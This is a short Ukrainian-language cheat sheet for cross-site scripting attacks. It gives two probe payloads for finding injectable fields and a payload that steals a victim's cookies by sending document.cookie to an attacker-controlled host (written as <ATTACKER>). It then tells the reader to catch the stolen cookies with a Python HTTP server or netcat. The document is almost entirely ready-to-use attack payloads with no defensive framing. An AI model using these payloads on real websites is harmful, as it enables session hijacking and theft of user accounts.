# XSS

## Перевірки
```html
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```
## Викрадення cookie (reflected/stored)
```html
<script>new Image().src='http://<ATTACKER>/c?='+document.cookie</script>
```
**Що далі:** слухай `python3 -m http.server` або nc на стороні атакера.
